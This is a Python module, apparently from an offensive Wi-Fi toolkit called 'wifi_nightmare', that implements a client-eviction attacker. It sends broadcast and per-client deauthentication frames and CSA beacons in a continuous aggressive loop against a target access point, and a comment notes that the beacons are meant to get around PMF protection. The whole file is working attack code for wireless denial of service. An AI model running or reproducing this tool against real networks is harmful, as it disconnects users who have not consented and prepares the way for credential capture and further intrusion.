# deauth.py — Upgraded multi-vector client eviction (Deauth + CSA + BTM)
import time
import threading
try:
    from scapy.all import sendp, RadioTap, Dot11, Dot11Deauth, Dot11Disas
    HAS_SCAPY = True
except ImportError:
    sendp = None
    RadioTap = None
    Dot11 = None
    Dot11Deauth = None
    Dot11Disas = None
    HAS_SCAPY = False
from wifi_nightmare.logger import logger
from wifi_nightmare.eviction import AdvancedEviction


class BaseAttacker:
    def __init__(self, interface, target_bssid, target_channel, target_ssid=""):
        self.interface = interface
        self.target_bssid = target_bssid.lower()
        self.target_channel = target_channel
        self.target_ssid = target_ssid
        self.clients = set()
        self.stop_deauth = False
        self.deauth_sent = 0
        self.eviction_engine = AdvancedEviction(interface, target_bssid, target_channel, target_ssid)

    def _get_interface_mac(self):
        try:
            from scapy.all import get_if_hwaddr
            return get_if_hwaddr(self.interface)
        except Exception:
            logger.warning(f"Could not get MAC for {self.interface}, using fake MAC")
            return "00:11:22:33:44:55"

    def _send_deauth_broadcast(self, count=5):
        try:
            sent = self.eviction_engine.send_deauth_burst(client_mac=None, count=count)
            # Also inject 1 CSA beacon to evict PMF clients in the area
            sent += self.eviction_engine.send_csa_burst(count=1)
            self.deauth_sent += sent
            return True
        except Exception as e:
            logger.debug(f"Broadcast eviction failed: {e}")
            return False

    def _send_deauth_to_client(self, client_mac, count=3):
        try:
            if client_mac.startswith(("33:33", "ff:ff", "01:00")):
                return False
            sent = self.eviction_engine.evict_client(client_mac=client_mac, pmf_active=False)
            self.deauth_sent += sent
            return True
        except Exception as e:
            logger.debug(f"Client eviction failed for {client_mac}: {e}")
            return False

    def _deauth_loop_aggressive(self):
        try:
            while not self.stop_deauth:
                try:
                    self._send_deauth_broadcast(count=4)
                    current_clients = list(self.clients)
                    for client_info in current_clients:
                        client_mac = client_info[0] if isinstance(client_info, tuple) else client_info
                        self._send_deauth_to_client(client_mac, count=2)
                    time.sleep(0.5)
                except Exception as e:
                    logger.debug(f"Deauth loop error: {e}")
                    time.sleep(1)
        except Exception as e:
            logger.error(f"Deauth loop crashed: {e}")
